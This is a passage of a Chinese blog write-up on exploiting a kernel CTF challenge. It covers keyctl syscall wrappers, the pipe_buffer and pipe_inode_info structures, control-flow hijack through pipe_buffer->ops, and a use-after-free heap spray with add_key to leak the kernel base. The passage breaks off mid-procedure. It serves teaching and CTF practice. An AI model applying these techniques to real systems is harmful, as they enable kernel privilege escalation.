<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING	-2	<span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE			2	<span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE			3	<span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK			9	<span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ			11	<span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_READ, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span></span>&#123;                                                                             <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="5-pipe基础知识"><a href="#5-pipe基础知识" class="headerlink" title="5.pipe基础知识"></a>5.pipe基础知识</h3><p>这里为了继续进行咱们的利用，还需要学习一个新的结构体，那就是pipe，他被实现为一个系统调用，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">IPE(2)                                                                                            Linux Programmer&#x27;s Manual                                                                                            PIPE(2)<br><br>NAME<br>       pipe, pipe2 - create pipe<br><br>SYNOPSIS<br>       #include &lt;unistd.h&gt;<br><br>       /* On Alpha, IA-64, MIPS, SuperH, and SPARC/SPARC64; see NOTES */<br>       struct fd_pair &#123;<br>           long fd[2];<br>       &#125;;<br>       struct fd_pair pipe();<br><br>       /* On all other architectures */<br>       int pipe(int pipefd[2]);<br><br>       #define _GNU_SOURCE             /* See feature_test_macros(7) */<br>       #include &lt;fcntl.h&gt;              /* Obtain O_* constant definitions */<br>       #include &lt;unistd.h&gt;<br><br>       int pipe2(int pipefd[2], int flags);<br><br>DESCRIPTION<br>       pipe()  creates  a pipe, a unidirectional data channel that can be used for interprocess communication.  The array pipefd is used to return two file descriptors referring to the ends of the pipe.  pipefd[0] refers to<br>       the read end of the pipe.  pipefd[1] refers to the write end of the pipe.  Data written to the write end of the pipe is buffered by the kernel until it is read from the read end of the pipe.  For further details, see<br>       pipe(7).<br><br>       If flags is 0, then pipe2() is the same as pipe().  The following values can be bitwise ORed in flags to obtain different behavior:<br><br></code></pre></td></tr></table></figure>

<p>说到这个管道，我们对他的第一印象那肯定是进程之间的交互，不妨我们往深处想一想他的原理，我们该如何使得两个进程有信息交换呢？一种无非是创建一个文件，然后两个进程分别往里面读写，这是一种可行的方式，而如果我们不采用与硬盘联系的方式呢，因为与硬盘交互太累了并且也太慢，所以我们转头可以到他的内核方向去想，因为每个进程的用户空间不同，但是内核空间都是相同的，那么我们就可以在内核中开辟一段空间，使得我们不同的进程可以同时访问，这就使得两者之间存在了一个通讯的桥梁，也被称作管道。</p>
<p>他的使用方法我们可以查看linux手册，十分方便。大致意思就是，在内核空间创建一个虚拟的inode，该inode一般是作为文件指针以及描述文件的功能而存在，这里仅仅是凭空创建，并不设计文件的产生。创建完inode后，则将当前进程的一个文件描述符赋值，具体赋值写描述符还是读描述符则靠程序员自身指定，一般pipe_fd[0]为读指针，pipe_fd[1]为写指针，手册里面的实例更类似于匿名管道（可能有错误</p>
<p>接下来我们在源码层面来深入了解一下其利用点</p>
<p>首先我们需要找到pipe系统调用的一个源码，它位于<code>fs/pipe.c</code>当中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br>	<span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>	<span class="hljs-type">int</span> error;<br><br>	error = __do_pipe_flags(fd, files, flags);<br>	<span class="hljs-keyword">if</span> (!error) &#123;<br>		<span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>			fput(files[<span class="hljs-number">0</span>]);<br>			fput(files[<span class="hljs-number">1</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>			put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>			error = -EFAULT;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>			fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br><br>SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br>	<span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>他分为两种pipe系统调用，分别为<code>pipe</code>和<code>pipe2</code>，其区别就是flags的区别，最终调用了<code>do_pipe2</code>函数，其调用链如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			get_pipe_inode 			<span class="hljs-comment">//对于该管道inode的fops赋值为pipefifo_fops</span><br>				<span class="hljs-function">alloc_pipe_info</span><br><span class="hljs-function">					<span class="hljs-title">kzalloc</span><span class="hljs-params">(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT</span></span><br><span class="hljs-params"><span class="hljs-function">					kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT)</span></span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>	pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br>	<br>    ...<br><br>	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT);<br><br>	...<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS	16</span><br></code></pre></td></tr></table></figure>



<p>可以看到最终的链条会分配一个pipe_inode_info大小的结构体,他的块会从kmalloc-192入手，</p>
<h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *	@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *	@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *	@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *	@head: The point of buffer production</span><br><span class="hljs-comment"> *	@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *	@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *	@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *	@tmp_page: cached released page</span><br><span class="hljs-comment"> *	@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *	@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *	@r_counter: reader counter</span><br><span class="hljs-comment"> *	@w_counter: writer counter</span><br><span class="hljs-comment"> *	@poll_usage: is this pipe used for epoll, which has crazy wakeups?</span><br><span class="hljs-comment"> *	@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *	@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *	@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *	@user: the user who created this pipe</span><br><span class="hljs-comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br>	<span class="hljs-type">bool</span> poll_usage;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span> 			<span class="hljs-comment">//存放pipe_buffer数组</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br></code></pre></td></tr></table></figure>

<h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><p>然后调用kcalloc分配pipe_buffer，分配块大小为<code>pipe_bufs * sizeof(struct pipe_buffer)</code>,其中pipe_bufs默认为16，他将会从kmalloc-1k进行取obj,所以如果我们控制了pipe_inode_info,那么我们就可以获取该动态分配的堆块值，也就是pipe_inode_info-&gt;bufs</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *	@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *	@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *	@len: length of data inside the @page</span><br><span class="hljs-comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *	@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *	@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>上述结构体可以保证我们泄露出内核堆地址，但这还不够，我们甚至可以利用它来控制执行流，</p>
<p>下面来分析该pipe的释放过程：</p>
<p>我们上面知道，管道创建后有两个文件描述符，一个读一个写，所以当这两个文件描述符都被关闭的时候就会正式的关闭管道</p>
<p>要分析资源释放的过程，我们需要知道他的释放函数，当我们释放文件描述符的时候，程序员并不会管你这个文件是管道还是什么，与关闭其他文件唯一不同的就是inode的释放函数，我们在上面获取pipe的途中调用了get_pipe_inode,其中便对于其指针进行了赋值，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br>	...<br>	<br>	inode-&gt;i_fop = &amp;pipefifo_fops;<br><br>	...<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>	.open		= fifo_open,<br>	.llseek		= no_llseek,<br>	.read_iter	= pipe_read,<br>	.write_iter	= pipe_write,<br>	.poll		= pipe_poll,<br>	.unlocked_ioctl	= pipe_ioctl,<br>	.release	= pipe_release,<br>	.fasync		= pipe_fasync,<br>	.splice_write	= iter_file_splice_write,<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>可以知道该管道的release函数指针被赋值为<code>pipe_release</code>函数，其调用链如下：</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">pipe_release</span><br>	<span class="hljs-variable">put_pipe_info</span><br>		<span class="hljs-variable">free_pipe_info</span><br>			<span class="hljs-variable">pipe_buf_release</span><br>				<span class="hljs-variable">pipe_buffer.ops</span>-&gt;<span class="hljs-function"><span class="hljs-title">release</span>(<span class="hljs-variable">pipe_buf_release</span>)</span><br></code></pre></td></tr></table></figure>

<p>可以看到最终是调用了pipe_buffer.ops上的函数，因此如果我们可以修改pipe_buffer上面的函数表，那么我们就可以在释放管道两个文件的时候成功的控制我们的程序流</p>
<h4 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h4><p>下面是pipe_buffer的函数表:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note on the nesting of these functions:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -&gt;confirm()</span><br><span class="hljs-comment"> *	-&gt;try_steal()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * That is, -&gt;try_steal() must be called on a confirmed buffer.  See below for</span><br><span class="hljs-comment"> * the meaning of each operation.  Also see the kerneldoc in fs/pipe.c for the</span><br><span class="hljs-comment"> * pipe and generic variants of these hooks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment">	 * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment">	 * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment">	 * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment">	 * error.  If not present all pages are considered good.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment">	 * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment">	 * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment">	 * most often used case is insertion into different file address space</span><br><span class="hljs-comment">	 * cache.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">bool</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Get a reference to the pipe buffer.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">bool</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="6-漏洞利用"><a href="#6-漏洞利用" class="headerlink" title="6.漏洞利用"></a>6.漏洞利用</h3><p>前面铺垫了一大段相关知识，总算是可以到我们的正题了，回忆一下题目中的条件</p>
<ol>
<li>存在ioctl系统调用，其中根据我们传递的cmd来判断，如果是0xdeadbeef，则分配堆块，若是0xc0decafe，则释放堆块,且该释放堆块存在悬垂指针，也就是有UAF</li>
<li>堆块存放的idx只能为0或1</li>
<li>题目开启kalsr，smep&#x2F;smap，kpti</li>
</ol>
<p>我们首先需要考虑的是地址泄露</p>
<h4 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h4><p>我们利用到堆喷的思路以及add_key系统调用的利用,当我们在利用add_key来获取了一个key_id的时候，我们就可以通过keyctl系统调用来对他进行操作，其中的详细部分可以参考上面所讲。</p>
<p>当key中的payload被释放过后，其中的user_key_payload-&gt;rcu-&gt;callback_head函数指针会被修改为<code>user_free_payload_rcu</code>,而他是一个全局变量，所以当我们释放过后通过UAF漏洞就可以泄露出内核的基地址了，</p>
<p>下面便是本题当中内核堆喷以及泄露的详细过程：</p>
<ol>
<li>首先构建UAF obj，也就是说利用漏洞模块中的ioctl来创建一个obj并释放掉他，此时我们要注意到该obj的指针是并没有置空的，我们仍可以继续使用，并且这里的大小为了配合后面的add_key系统调用，所以统一分配kmalloc-192（这里使用别的也可以</li>
<li>堆喷user_key_payload,由于我们知道，add_key系统调用需要先临时分配一个obj来存放payload，然后再分配一个(payload+head)的obj来存放user_key_payload,最后再释放掉上面一个临时堆块，所以我们的UAF obj会不停的被分配为临时payload然后释放，这将导致我们一直无法使得UAF obj被分配成user_key_payload</li>
<li>步骤2中的情况一直持续到该slab全被耗空，此时假设slab当中就只剩下刚刚释放掉的临时堆块，此时我们再次add_key,这将导致UAF obj再次被分配为临时payload，但是，<strong>这里发现该slab没有剩余的obj来分配给user_key_payload,那么题目会把当前正在使用的slab存放回slab当中，并且从kmem_cache_node中搜寻partial slab来放置回kmem_cache_cpu-&gt;freelist当中，这样一来我们的user_key_payload将从新的slab当中分配，分配完毕后，我们的临时payload，也就是UAF obj将被放回node当中作为partial slab存在</strong></li>
